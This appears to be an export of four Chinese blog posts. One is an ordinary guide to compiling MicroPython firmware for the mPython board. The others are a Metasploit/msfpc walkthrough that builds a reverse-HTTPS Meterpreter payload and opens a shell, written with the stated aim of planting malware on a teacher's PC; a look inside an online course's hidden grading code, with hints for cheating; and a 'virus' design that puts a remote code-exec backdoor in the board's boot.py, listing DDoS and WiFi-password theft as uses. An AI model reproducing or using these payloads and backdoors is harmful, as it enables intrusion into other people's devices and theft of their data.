{"posts":[{"title":"【教程/记录？】编译适用于掌控版的microPython固件","content":" 不多bb，进入正题 导入词我就懒得写了LOL 本文重点在于环境配置，在阅读本文前您需要熟知有关Linux的基本命令和一些WSL2特性（建议多查多做） Tip:按顺序继续即可 提前准备 环境：Windows10LTSC2021（手动安装了MicrosoftStore） 使用终端：新版UI的Powershell与GitBash 软件： Git 可正常访问外网的网络环境（推荐自由猫机场，单月6.9r/100G，体验较好，有IPEL/IPLC专线（此套餐50-99r），一次性85折优惠码：FREECAT） WSLDebian (可选)在仅搭载Windows系统的MacBookAir开启虚拟化 此处解决方法来源于Win10如何更改bootmgr路径与Mac OS装Windows系统开启虚拟化 下载rEFInd rEFInd的可执行文件托管在SourceForge上，下载链接：https://sourceforge.net/projects/refind/ 进入页面后点击最显眼的Download即可下载，将会下载下来一个压缩包，解压到一个临时目录，使用以下命令挂载EFI分区： mountvol Z: /s 接着 我们编辑压缩包解压后的文件，在[解压后的目录]/refind-bin-xxxxx/refind/下，有一个文件叫refind.conf-sample，去掉后面的-sample，并且打开文件，找到#enable_and_lock_vmx false，修改为enable_and_lock_vmx true 我们切换到Z:/EFI下并复制文件： xcopy /E [在刚刚修改文件的位置的文件夹] Z:\\EFI\\refind\\ 复制完成后，我们使用BCDEdit修改默认启动项（记得使用管理员权限）： bcdedit /set &quot;{bootmgr}&quot; path \\EFI\\refind\\refind_[系统架构].efi 在Win10以前的版本中，&quot;{bootmgr}&quot;应为{bootmgr} 当提示“操作成功完成。”后，重启便可以看到，已经开启虚拟化了 部署虚拟机Debian11 打开控制面板，点击程序-启用或关闭Windows功能，勾选&quot;适用于Windows的Linux子系统&quot;，点确定，重启 下载此链接的内容然后双击运行，点击安装，稍等一会即可 在终端内输入debian，像我这样操作： Installing, this may take a few minutes... Please create a default UNIX user account. The username does not need to match your Windows username. For more information visit: https://aka.ms/wslusers Enter new UNIX username: gxxk //这一步是设置用户名，建议使用全小写字母/数字 New password: //让你设置这个账户的密码，因Linux特性 不会显示此处内容 Retype new password: //再输一遍加深印象 passwd: password updated successfully Installation successful! 适用于 Linux 的 Windows 子系统现已在 Microsoft Store 中可用! 你可以通过运行“wsl.exe --update”或通过访问 https://aka.ms/wslstorepage 进行升级 从 Microsoft Store 安装 WSL 将可以更快地获取最新的 WSL 更新。 有关详细信息，请访问 https://aka.ms/wslstoreinfo gxxk@W10MacBook:~$sudo passwd root [sudo] password for gxxk: //输入你之前设置的密码 New password: //再设置一个新密码（后面叫做密码2） Retype new password: //再输一遍加深印象 passwd: password updated successfully 关于内容可以自行翻译，自行理解，完全照抄也是没有问题的 在安装完成后，输入exit并回车，退出Debian，接着执行wsl.exe --update，更新这个WSL子系统，就可以进入下一步操作了 (可选)更换WSL存储位置 此操作仅适用于当您的 存储Windows目录的分区（人话：C盘） 空间不够时才建议使用！ 打开终端，列出目前安装的WSL版本 wsl -l --all -v 得到回复： NAME STATE VERSION * Debian Stopped 1 接下来我们导出它（wsl --export &lt;系统名&gt; &lt;导出目录&gt;）： wsl --export Debian G:\\WSL初始Debian系统备份_用户名root_密码root.tar 得到回复： 正在导出，这可能需要几分钟时间。 操作成功完成。 然后我们删掉原来的WSL（wsl --unregister &lt;系统名&gt;）： wsl --unregister Debian 得到回复： 正在注销。 操作成功完成。 接着再导入WSL(wsl --import Debian 将要导入到何处 WSL文件位置 --version &lt;WSL版本号&gt;): wsl --import Debian G:\\WSL_Debian G:\\WSL初始Debian系统备份_用户名root_密码root.tar --version 2 Linux配置 换源 Debian Buster(Debian10) 以上版本默认支持 HTTPS 源。如果遇到无法拉取 HTTPS 源的情况，请先使用 HTTP 源并安装： apt install apt-transport-https ca-certificates nano /etc/apt/sources.list 编辑器注释掉前4行，输入 deb https://mirrors.huaweicloud.com/debian/ bookworm main non-free non-free-firmware contrib deb-src https://mirrors.huaweicloud.com/debian/ bookworm main non-free non-free-firmware contrib deb https://mirrors.huaweicloud.com/debian-security/ bookworm-security main deb-src https://mirrors.huaweicloud.com/debian-security/ bookworm-security main deb https://mirrors.huaweicloud.com/debian/ bookworm-updates main non-free non-free-firmware contrib deb-src https://mirrors.huaweicloud.com/debian/ bookworm-updates main non-free non-free-firmware contrib deb https://mirrors.huaweicloud.com/debian/ bookworm-backports main non-free non-free-firmware contrib deb-src https://mirrors.huaweicloud.com/debian/ bookworm-backports main non-free non-free-firmware contrib 除此之外，你也可使用清华大学镜像站提供的Debian软件源 更新 apt-get update 安装各类软件 apt-get install git curl wget python3 python-is-python3 python3-pip -y pip install virtualenv --break-system-packages (可选)设置代理 来源于 https://zhuanlan.zhihu.com/p/153124468 新建文件（touch &quot;在此处填写文件名&quot;），并使用nano编辑（nano &quot;在此处填写要编辑的文件的文件名&quot;） 运行nano时，当此目录没有命令中提到的文件时，会自动新建空文件 nano .proxy 在文件内写入如下内容 #!/bin/bash proxy_ip=$(cat /etc/resolv.conf |grep &quot;nameserver&quot; |cut -f 2 -d &quot; &quot;) # 代理IP，此处内容代表Windows宿主机IP proxy_port=7890 # 代理端口 export ALL_PROXY=&quot;http://$proxy_ip:$proxy_port&quot; 如果你的软件支持其他代理方式，也可以改写代码，使用代理软件所给的其他命令，例如类似笔者使用的Clash就可以这么配置： #!/bin/bash ip=$(cat /etc/resolv.conf |grep &quot;nameserver&quot; |cut -f 2 -d &quot; &quot;) port=11459 export https_proxy=&quot;http://$ip:$port&quot; export http_proxy=&quot;http://$ip:$port&quot; 接下来，您可以使用以下代码在WSL中使用代理了： source .proxy 23.01.24更新： 基于WSL2的一些特性，开机时会自动随机选取一堆端口作为WSL的 “随机保留端口” ，这个时候之前的需要用到刚好是保留端口的软件就被顶掉了，就会导致代理软件显示端口为0，目前AFAIK（据我所知），没有绝对的不会被抽中的的端口，总之再换一个就可以了哦~ 网传部分版本的代理软件可以设置动态端口 下载存储库 打开终端后执行如下代码，（目录下可以有其他文件，下载的时候会自动新建文件夹mpython） 执行此命令： git clone https://github.com/labplus-cn/mpython.git --recursive 命令意思解析： git:Git软件的名称 clone:克隆仓库 https://github.com/labplus-cn/mpython.git:掌控版固件存放代码的仓库的网址 --recursive:一次性下载这个仓库里面所有的内容 下载速度取决于你的网速，推荐使用上文提到的自由猫机场下载，启动后直接把电脑挂机即可，去吃顿晚餐或玩会hypixel吧 23.01.24更新： 如直接在裸机进行编译操作（如树莓派），可以尝试使用镜像站点，例如 FastGit 等，例如： git config --global url.&quot;https://hub.fgit.cf/&quot;.insteadOf &quot;https://github.com/&quot;：在每次进行操作时如果在Github服务器上进行操作，那么将服务器地址替换为镜像站地址 git config --global protocol.https.allow always`：设置传输协议总是https 接下来再次体验clone，感受速度差异（记得关掉配置的代理） 下载完成后，可以看看大小，我这里大小约为3.22G，实际占用5.08G，36486 个文件，5612个文件夹 如果确认下载成功就可以进行下一步了 配置EDP-IDF 切换到mpython/esp-idf目录，安装依赖（pip install -r requirement.txt --break-system-packages），执行install.sh进行安装： root@W10MacBook:~# cd mpython/esp-idf root@W10MacBook:~/mpython/esp-idf# pip install -r requirement.txt --break-system-packages [因篇幅，省略部分内容] root@W10MacBook:~/mpython/esp-idf# ./install.sh Installing ESP-IDF tools Installing tools: xtensa-esp32-elf, esp32ulp-elf, openocd-esp32 [因篇幅，省略部分内容] All done! You can now run: . ./export.sh root@W10MacBook:~/mpython/esp-idf# 完成后，执行source ./export.sh，让安装好的工具可以被运行（加入到环境变量） 笔者执行时会提示tool openocd-esp32 has no installed versions.等内容，此时请执行 apt-get install libhidapi-libusb0并再次source ./export.sh解决此Bug Tip:此解决方法来源于官方仓库某一issue 获取mpy-cross 这里有两种办法，1是我曾提到过的下载pypi上的mpy-cross-v5，2是自行编译，前者方法因曾讲述过便不再列出，此处详解后者方法 cd ~/mpython/micropython/mpy-cross 执行上方代码，切换到目录，运行后进行下一步 make 稍等片刻，便会出来如下面展示的内容： LINK mpy-cross text data bss dec hex filename 287468 17104 896 305468 4a93c mpy-cross 这就是生成成功了，我们接下来进行下一步操作 编译 切换到mpython/port目录，执行make： cd ~/mpython/port make 在编译完成后，应给出如下字段： Create build/mpython//firmware.bin bootloader 20336 partitions 3072 application 1640896 total 1706432 但这还不够，我们通常刷入的官方提供的固件均内嵌了Noto字体便于中文文字显示，接下来我们就需要合并镜像 合并镜像 切换到~/mpython/port/，我们使用python执行脚本release.py： cd ~/mpython/port python ./release.py \\ ./build/mpython/bootloader.bin \\ ./build/mpython/partitions.bin \\ ./build/mpython/application.bin \\ ./Noto_Sans_CJK_SC_Light16.bin \\ ./firmware.bin # 此处&quot;firmware&quot;可随意更改为其他名字 此时，我们使用mv命令移动到宿主机上： mv ./[名字].bin /mnt/[盘符]/[文件夹]/[文件夹]/[文件名].bin 例： mv ./firmware.bin /mnt/g/PythonProject/mPython/firmware.bin 即为将当前目录下的firmware.bin移动到宿主机的G盘上的PythonProject文件夹内的mPython文件夹 此时，在对应目录出现的对应文件即为固件，可用于刷入了 懒人包 当然了，如果你是实在没有能力配置环境可以下载下方链接的懒人包，使用WSL导入命令导入后，进入~/mpython/port后直接执行make即可编译并合并为一个可用固件 版本：WSL2 采用版本:11.27-c0d2dff 用户名/密码：root WSL 版本： 2.0.9.0 下载链接：https://pan.baidu.com/s/1pwae9wDWKuiz1CXJUjGlNQ?pwd=Gxxk 提取码：Gxxk ","link":"https://gxxk.site/BAt_EdAD5/"},{"title":"【水】记一次有手就行的基于Metasploit的渗透","content":" 本文仅介绍此渗透方法，仅供学习，不承担执行此教程带来的任何损失！ 话题导入/初识msfpc 今天因为被班任用监控制裁这一事十分不服，被叫到办公室训话时发现老师还有一个在高处的监控（老师靠那个看见我搞小动作的），并且还是用网页访问，心生一计，给老师电脑下马（指在老师电脑上下载并执行我可控的恶意软件），于是回家就开始研究起来 Kali Linux 启动！ 打开Kali，我熟练的搜索“msf”，没想到还多了几个新朋友（也可能是我之前眼瞎没看见LOL） “既然已有了msfvenom，怎么还多了个MSFPC？看缩写可能是 payload creator（机翻载荷创建器 可以理解为攻击方和被控方的一个中间商/恶意软件（这种软件统称payload））”揣着疑问与好奇，我点开了MSFPC，果不其然，此工具全名MSFvenom Payload Creator，在当前Kali Linux 2023.3版本上1.4.5，就是msfvenom的更易用的版本，下方是帮助文档与机翻润色： msfpc [*] MSFvenom Payload Creator (MSFPC v1.4.5) [i] Missing TYPE or BATCH/LOOP mode /usr/bin/msfpc &lt;TYPE&gt; (&lt;DOMAIN/IP&gt;) (&lt;PORT&gt;) (&lt;CMD/MSF&gt;) (&lt;BIND/REVERSE&gt;) (&lt;STAGED/STAGELESS&gt;) (&lt;TCP/HTTP/HTTPS/FIND_PORT&gt;) (&lt;BATCH/LOOP&gt;) (&lt;VERBOSE&gt;) Example: /usr/bin/msfpc windows 192.168.1.10 # Windows &amp; manual IP. /usr/bin/msfpc elf bind eth0 4444 # Linux, eth0's IP &amp; manual port. /usr/bin/msfpc stageless cmd py https # Python, stageless command prompt. /usr/bin/msfpc verbose loop eth1 # A payload for every type, using eth1's IP. /usr/bin/msfpc msf batch wan # All possible Meterpreter payloads, using WAN IP. /usr/bin/msfpc help verbose # Help screen, with even more information. &lt;TYPE&gt;: + APK + ASP + ASPX + Bash [.sh] + Java [.jsp] + Linux [.elf] + OSX [.macho] + Perl [.pl] + PHP + Powershell [.ps1] + Python [.py] + Tomcat [.war] + Windows [.exe // .exe // .dll] Rather than putting &lt;DOMAIN/IP&gt;, you can do a interface and MSFPC will detect that IP address. Missing &lt;DOMAIN/IP&gt; will default to the IP menu. Missing &lt;PORT&gt; will default to 443. &lt;CMD&gt; is a standard/native command prompt/terminal to interactive with. &lt;MSF&gt; is a custom cross platform shell, gaining the full power of Metasploit. Missing &lt;CMD/MSF&gt; will default to &lt;MSF&gt; where possible. &lt;BIND&gt; opens a port on the target side, and the attacker connects to them. Commonly blocked with ingress firewalls rules on the target. &lt;REVERSE&gt; makes the target connect back to the attacker. The attacker needs an open port. Blocked with engress firewalls rules on the target. Missing &lt;BIND/REVERSE&gt; will default to &lt;REVERSE&gt;. &lt;STAGED&gt; splits the payload into parts, making it smaller but dependent on Metasploit. &lt;STAGELESS&gt; is the complete standalone payload. More 'stable' than &lt;STAGED&gt;. Missing &lt;STAGED/STAGELESS&gt; will default to &lt;STAGED&gt; where possible. &lt;TCP&gt; is the standard method to connecting back. This is the most compatible with TYPES as its RAW. Can be easily detected on IDSs. &lt;HTTP&gt; makes the communication appear to be HTTP traffic (unencrypted). Helpful for packet inspection, which limit port access on protocol - e.g. TCP 80. &lt;HTTPS&gt; makes the communication appear to be (encrypted) HTTP traffic using as SSL. Helpful for packet inspection, which limit port access on protocol - e.g. TCP 443. &lt;FIND_PORT&gt; will attempt every port on the target machine, to find a way out. Useful with stick ingress/engress firewall rules. Will switch to 'allports' based on &lt;TYPE&gt;. Missing &lt;TCP/HTTP/HTTPS/FIND_PORT&gt; will default to &lt;TCP&gt;. &lt;BATCH&gt; will generate as many combinations as possible: &lt;TYPE&gt;, &lt;CMD + MSF&gt;, &lt;BIND + REVERSE&gt;, &lt;STAGED + STAGELESS&gt; &amp; &lt;TCP + HTTP + HTTPS + FIND_PORT&gt; &lt;LOOP&gt; will just create one of each &lt;TYPE&gt;. &lt;VERBOSE&gt; will display more information. ----------我是一条分割线awa---------- &amp; msfpc [*]MSFvenom payload创建器(MSFPC v1.4.5)。 [i]缺少执行类型或 batch/loop 模式。 /usr/bin/msfpc&lt;type&gt;(&lt;攻击方 域/IP&gt;)(&lt;端口&gt;)(&lt;cmd/msf&gt;)(&lt;正向/反向&gt;)(&lt;Stage/Stageless&gt;)(&lt;TCP/HTTP/HTTPS/Find_Port&gt;)(&lt;Batch/Loop&gt;)(&lt;Verbose&gt;)。 示例： /usr/bin/msfpc windows 192.168.1.10 #创建Windows平台的 /usr/bin/msfpc elf bind eth0 4444 # 创建Linux平台的会连接到攻击方eth0网卡IP的payload(正向链接) /usr/bin/msfpc stageless cmd py https#Python，Stageless命令提示符。 /usr/bin/msfpc详细循环eth1#每种类型的有效负载，使用eth1的S IP。 /usr/bin/msfpc msf Batch wan#所有可能的Meterpreter有效负载，使用广域网IP。 /usr/bin/msfpc Help Verbose#Help屏幕，包含更多信息。 &lt;type&gt;可用参数： +APK +ASP +ASPX +Bash[.sh] +Java[.jsp] +Linux[.self] +OSX[.macho] +Perl[.pl] +PHP +PowerShell[.ps1] +PYTHON[.py] +Tomcat[.war] +Windows[.exe/.dll] 缺失参数&lt;攻击方 域/IP&gt;，您可以执行一个接口，MSFPC将检测到该IP地址。 缺失参数&lt;攻击方 域/IP&gt;将默认为IP菜单。 （这2句不会翻，总之创建的时候别漏写IP就行） 缺失&lt;端口&gt;将默认端口为443。 &lt;cmd&gt;是用于交互的标准/本机命令提示符/终端。 &lt;msf&gt;是一个自定义的跨平台外壳，获得了Metasploit的全部功能。 缺失参数&lt;CMD/MSF&gt;将在可能的情况下默认为&lt;MSF&gt;。 &lt;正向&gt;在被攻击端打开一个端口，攻击者将连接到这些端口进行渗透。通常会被目标上的入口防火墙规则阻止。 &lt;反向&gt;使被攻击段主动连接攻击者接受渗透。攻击者需要开放对应端口。使用目标上的入口防火墙规则阻止。 缺失参数&lt;正向/反向&gt;将默认为&lt;反向&gt;。 &lt;Stage&gt;将payload拆分成多个部分，使其更小，但依赖于Metasploit。 &lt;Stageless&gt;是完整的独立payload。比&lt;Stage&gt;更‘稳定’。 缺少&lt;Stage/Stageless&gt;将在可能的情况下默认为&lt;Stage&gt;。 &lt;tcp&gt;是&lt;反向&gt;的标准方法。这是与类型最兼容的作为其原始的。可以很容易地在入侵检测系统上检测到。 &lt;HTTP&gt;使通信看起来像是HTTP流量(未加密)。有助于数据包检测，这限制了对协议(如TCP80)的端口访问。 &lt;HTTPS&gt;使通信看起来像是加密的HTTP通信。有助于数据包检测，这限制了对协议(例如，TCP443)的端口访问。 &lt;Find_Port&gt;将尝试目标计算机上的每个端口，以找到出路。适用于Stick入口/入口防火墙规则。将根据&lt;type&gt;切换到‘allports’。 缺少参数&lt;TCP/HTTP/HTTPS/Find_Port&gt;将默认为&lt;tcp&gt;。 &lt;Batch&gt;将生成尽可能多的组合：&lt;type&gt;、&lt;CMD+MSF&gt;、&lt;BIND+REVERSE&gt;、&lt;Stage+Stage less&gt;&amp;&lt;TCP+HTTP+HTTPS+Find_Port&gt;。 &lt;loop&gt;将只为每个&lt;type&gt;创建一个。 &lt;Verbose&gt;将显示更多信息。 小试牛刀-这不有手就行嘛！ 在简单看完之后，我打算对我的宿主机进行一次测试，先经过简单的虚拟机调整，再根据帮助文档，我写出了如下指令，便进行运行： ┌──(kali㉿kali)-[~] └─$ msfpc Windows 192.168.179.131 443 MSF REVERSE STAGELESS HTTPS [*] MSFvenom Payload Creator (MSFPC v1.4.5) [i] IP: 192.168.179.131 [i] PORT: 443 [i] TYPE: windows (windows/meterpreter_reverse_https) [i] CMD: msfvenom -p windows/meterpreter_reverse_https -f exe \\ --platform windows -a x86 -e generic/none LHOST=192.168.179.131 LPORT=443 \\ &gt; '/home/kali/windows-meterpreter-stageless-reverse-https-443.exe' [i] windows meterpreter created: '/home/kali/windows-meterpreter-stageless-reverse-https-443.exe' [i] MSF handler file: '/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc' [i] Run: msfconsole -q -r '/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc' [?] Quick web server (for file transfer)?: python2 -m SimpleHTTPServer 8080 [*] Done! ┌──(kali㉿kali)-[~] └─$ msfconsole -q -r '/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc' [*] Processing /home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc for ERB directives. resource (/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc)&gt; use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp resource (/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc)&gt; set PAYLOAD windows/meterpreter_reverse_https PAYLOAD =&gt; windows/meterpreter_reverse_https resource (/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc)&gt; set LHOST 192.168.179.131 LHOST =&gt; 192.168.179.131 resource (/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc)&gt; set LPORT 443 LPORT =&gt; 443 resource (/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc)&gt; set ExitOnSession false ExitOnSession =&gt; false resource (/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc)&gt; set EnableStageEncoding true [!] Unknown datastore option: EnableStageEncoding. Did you mean EnableUnicodeEncoding? EnableStageEncoding =&gt; true resource (/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc)&gt; run -j [*] Exploit running as background job 0. [*] Exploit completed, but no session was created. msf6 exploit(multi/handler) &gt; # 此时将恶意软件在目标机器上运行（建议管理员权限） [*] Started HTTPS reverse handler on https://192.168.179.131:443 [!] https://192.168.179.131:443 handling request from 192.168.179.1; (UUID: au1jad14) Without a database connected that payload UUID tracking will not work! [*] https://192.168.179.131:443 handling request from 192.168.179.1; (UUID: au1jad14) Redirecting stageless connection from /J83F7V1j2bOE1YXU4bkaoQ3Qy9QOYcXmelWRAuBwbPvjfixhNbBEUVtC-6y9sGtJgmTafB0yMsIodmHh7i6rPPDgwoDwfnt9NVrdKD-LBtlMQAn1sGJpBvA with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0' [!] https://192.168.179.131:443 handling request from 192.168.179.1; (UUID: au1jad14) Without a database connected that payload UUID tracking will not work! [*] https://192.168.179.131:443 handling request from 192.168.179.1; (UUID: au1jad14) Attaching orphaned/stageless session... [!] https://192.168.179.131:443 handling request from 192.168.179.1; (UUID: au1jad14) Without a database connected that payload UUID tracking will not work! [*] Meterpreter session 1 opened (192.168.179.131:443 -&gt; 192.168.179.1:6378) at 2023-12-03 10:27:49 -0500 # 此处代表连接成功，已打开会话 msf6 exploit(multi/handler) &gt; sessions 1 # 根据上一条消息给出的sessionID切换到对应会话 [*] Starting interaction with 1... meterpreter &gt; # 此时就已经成功获取控制 使用“?”获取帮助 meterpreter &gt; shell Process 14176 created. Channel 1 created. Microsoft Windows [�汾 10.0.19044.3208] (c) Microsoft Corporation����������Ȩ���� C:\\Users\\user\\Downloads&gt; # 拿到Shell 接下来任君发挥 分析命令/我是来看文的，不是来看催眠书的 从此次操作中，我们共执行了以下命令： msfpc Windows 192.168.179.131 443 MSF REVERSE STAGELESS HTTPS msfconsole -q -r '/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc' # 进入msfconsole，连接上目标机器 sessions 1 shell 让我们来逐条分析： 生成木马 msfpc Windows 192.168.179.131 443 MSF REVERSE STAGELESS HTTPS 这一条十分简单，在此段中，我列出了帮助文档和有助于理解的机翻润色，对应过来即为： msfpc -&gt; 创建恶意软件的工具名称 Windows -&gt; 恶意软件所作用的平台 192.168.179.131 -&gt; 攻击方的IP地址 MSF -&gt; 更全面的模式，可以使用更多功能，此参数的另外一个选项为 CMD ，仅能实现基本shell STAGELESS -&gt; 生成的恶意软件的部分恶意代码是存放于软件本体（STAGELESS选项，体积大但也大不到哪去，总之不超0.5mb）还是运行时攻击方通过网络传输恶意代码过来执行（STAGE选项，体积超小） HTTPS -&gt; 连接方式 分很多种 具体的自己去看 HTTPS可以防止一些简单的防火墙识别出来是恶意软件 进入监听模式 msfconsole -q -r '/home/kali/windows-meterpreter-stageless-reverse-https-443-exe.rc' 这一条不用记，这段类似的代码将会出现于上一条代码执行完后，具体位置在下方标注出来了： ┌──(kali㉿kali)-[~] └─$ msfpc Windows 省略... [*] MSFvenom Payload Creator (MSFPC v1.4.5) [i] 省略 省略 全部省略 [i] windows meterpreter created: '这里是生成的恶意软件的路径' [i] MSF handler file: 省略 [i] Run: 运行这个位置的命令！ [?] Quick web server (for file transfer)?: python2 -m SimpleHTTPServer 8080 [*] Done! 接下来呢？ 在进入监听模式后，需要用户触发恶意软件，触发后将会有一段文字代表某恶意软件开始连接到攻击方电脑，文字如下 [*] Started 连接类型 reverse handler on 链接地址 当连接完成，可以开始工作时，会出来这么一个字样： [*] XXXX(省略) session 会话id opened (IP地址:攻击端口 -&gt; 另一个IP:另一个端口) 一大串时间 这个时候 对应到我们执行的命令里面，就是： sessions 会话ID # 表示切换到xxx会话 当切换到对应会话ID时，咱就能搞事了，示范中，使用了shell命令作为演示，实际上还可以使用help或?命令列出可使用命令 总结 运行环境：Kali Linux 2023.3 VMWare虚拟机 使用工具：Metasploit套件，其中包含msfvenom/msfconsole/msfpc等命令 创建木马: msfpc 攻击平台 攻击者IP 攻击端口 MSF(如果你是山顶洞人也可以CMD) 正/反向链接(bind/reverse) 存储模式(stage(less)) 连接模式(http(s),tcp) 等待木马上钩： 找到创建木马时给出的以[*] Run:开头的内容，复制那一行内除[*] Run:以外的命令 或msfconsole -q -r '生成木马时额外给出的文件扩展名为.rc的文件的路径' 上钩后 使用sessions [sessionID]切换会话，直接执行sessions查看所有可用会话 使用help/--help/'?'在任何地方查看当前软件的帮助 有更多的不理解的词汇可以在后面加上msf进行搜索 查找其意思并补充在评论区 ","link":"https://gxxk.site/VJNwhqCfL/"},{"title":"[核桃编程-Python]课程模式下的代码会被修改吗？","content":"前言 好吧万年一更的我又来了 这是我很久之前就研究过的玩意，忽然想起来了临时写一下 摸索 最开始的起因是我运行代码时发现有时报错提示行数与代码本身错误位置行数不符合（旧版本客户端特性，目前似乎已被修复？）怀疑代码被修改，于是我： ... # 代码 print(__file__) ... # 代码 Tips: __file__变量存储的是当前正在运行的代码的路径，但在REPL下此变量不可用 如果没被修改，那么打印出来的结尾应该是code.py（核桃编程客户端默认代码文件名为code.py，而不是__init__.py或main.py等文件名） 但实际上是这样的（马赛克用于遮挡课程信息，15~19行为1种读取真实运行代码内容的方法，如方法被拦截，可能会放出） 于是，我按照此路径，读取出来了课程的代码 （吐槽一下：现版本作弊通关还有点难，以前的版本直接overWin(&quot;pass&quot;)就可以了，我还向老师提交了这个通关方法（你猜这是真的还是假的）） 好玩的是，居然什么也没发生，程序照常运行，没有输出任何内容 最开始，我怀疑是真实运行的代码不仅记录print内容，还在新版本更新中加上了一层过滤机制，于是，我使用dir()，查看了目前所有可调用对象： ['__annotations__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', '_p', 'check', 'correct_count', 'correct_country', 'country', 'country_medal_dict', 'hetao_message', 'i', 'index', 'input', 'input_list', 'ipt', 'json', 'l', 'medals', 'os', 'out_res', 'print', 'print_content', 'pt', 'r', 'random', 's', 's_json', 's_string', 'str_1', 'str_1_sub1', 'str_1_sub2', 'str_1_sub3', 'str_2', 'str_3', 'str_4', 'str_5', 'sys', 'time'] 根据经验，真正的print名称一般是某个看起来比较抽象的缩写或同义词等，print函数只会在pt(),print_content(),out_res(),_p()这几个中出现 经过实践，最终_p()才是真正的print函数，拿到真正的_p函数后，就可以快乐的读取真实代码了~ ccc怎么这么长啊，不放了 分析通用对象 总之大体分析了一下，根据经验，以下几个提到的东西应该大体上在这里通用 本文提到的所有对象可能在不同课程中不一样，请根据实际情况决定自己的行为 被替换的print函数（真正名称pt） 该对象用于记录学生使用print输出的内容到print_content，不支持原生print的sep/end/file/flush参数 此函数会对第一项传参（print(第一项传参，第二项传参...)）进行识别，如果其为&quot;hetao-&quot;或&quot;&quot;，就不会输出，也不会记录，直接停止函数运行 此外，该函数还会对无任何传参的print进行过滤，正常输出但不会记录至其中 被替换的input函数（原input名为ipt） 此函数不会使用到任何真正的input操作，而是会返回变量 s_string 此变量会由index变量（一个由random模块中的randint函数（随机数字））操作 报错函数（名为out_res） hide-code.py内没有该函数的完整代码，调用此函数效果为正常的代码编写错误弹出的提示，并在右侧以红色输出out_res弹窗内相同的文字 该函数会定义一个名为_str的局部变量，然后将其设为函数传参的最后一个传参（源代码为for _a in *args:_str=str(_a)），随后以退出码0退出（sys.exit(0)） 检查学生代码函数（名为check） 会根据使用print/input等输入/输出函数得到的值判断学生代码是否正确 检查逻辑是内置多个样本，每次运行随机选择样本输入，内置一份正确算法计算答案（存储此部分数据的变量开头一般为correct_），和学生运算的代码相比较，再根据细分出来的继续比较，找到代码错的原因并输出至用户界面 如果满足条件，会将hetao_message某（多）项的值设置为True，程序判断是否过关疑似依赖此部分 也有一部分课程中的练习，因为其难度较小且只用完成1-2行代码，可能会检测范围内是否有某特定词组/文本，如满足条件直接放行 可疑代码（位于学生代码执行阶段附近） 此代码会出现于学生编写的代码的第一行的上一行，内容为print(&quot;::walnut_cpp_scheme&quot;)，疑似用于与核桃编程用户界面交互 建议直接“一切皆文件”（ 程序结尾 此部分代码位于学生程序结尾，较简单，大致为调用check函数并根据其函数操作hetao_message的结果判断是否执行特定语句（如输出作业完成，点击提交等） 结尾 看起来似乎每个课程都会有专属的附加代码，挺佩服核桃程序员的工作量的（） 如果有任何纰漏欢迎在https://gxxk.site指出（ 对了顺便讲一声，此文在https://gxxk.site同时发布，可以来小站看看LOL ","link":"https://gxxk.site/oLE3FCiOr/"},{"title":"【水】【突发其想】掌控版注入病毒？","content":"众所周知，掌控版基于microPython，有许多好玩的模块/特性，包括但不限于： _thread多线程 exec执行代码 compile编译代码 “胶水”语言 那么，我们是否可以拿这些好玩的特性搞事情呢？已知： 有人移植了可在掌控版上可用的Flask（广泛意义上） microPython拥有boot.py，优先级最高，上电必须执行 使用_thread和预编译可以在几乎无感的情况下注入代码在boot.py内 我们就可以设想： 在boot.py文件最顶端写入这样一段代码： import virus virus.virus() 然后，我们再在virus.py写入我们更详细的代码 def virus(): from _thread import start_new_thread from urouter import uRouter server=uRouter() @server.route(&quot;/exec/&lt;command&gt;&quot;) def exec(command): try:return str(exec(command)) except:return &quot;Error!&quot; start_new_thread(server.serve_forever,()) 这里只是一个示例，但是实际上能做的事非常多，具体的还请各位看官自行想象，如： 成为肉鸡（指机器被黑客的远控程序控制）去DDOS他人网站 吓人，跟病毒一样 获取main.py程序并从中提取敏感信息（如WiFi密码（大多数人会拿手机号作为密码）） 妨碍用户正常使用（如多开线程使代码卡顿，申请大量内存等） 无限复制，潜伏到每个程序内 后续-23.12.08更新 最近全面的了解了一下~~msfpc(划掉)~~msfvenom，发现这玩意可玩性十分之高，甚至支持Python，随手生成了一个看看 ┌──(kali㉿kali)-[~] └─$ msfpc Python 127.0.0.1 11451 [*] MSFvenom Payload Creator (MSFPC v1.4.5) [i] IP: 127.0.0.1 [i] PORT: 11451 [i] TYPE: python (python/meterpreter/reverse_tcp) [i] CMD: msfvenom -p python/meterpreter/reverse_tcp -f raw \\ --platform python -e generic/none -a python LHOST=127.0.0.1 LPORT=11451 \\ &gt; '/home/kali/python-meterpreter-staged-reverse-tcp-11451.py' [i] python meterpreter created: '/home/kali/python-meterpreter-staged-reverse-tcp-11451.py' [i] MSF handler file: '/home/kali/python-meterpreter-staged-reverse-tcp-11451-py.rc' [i] Run: msfconsole -q -r '/home/kali/python-meterpreter-staged-reverse-tcp-11451-py.rc' [?] Quick web server (for file transfer)?: python2 -m SimpleHTTPServer 8080 [*] Done! ┌──(kali㉿kali)-[~] └─$ cat python-meterpreter-staged-reverse-tcp-11451.py 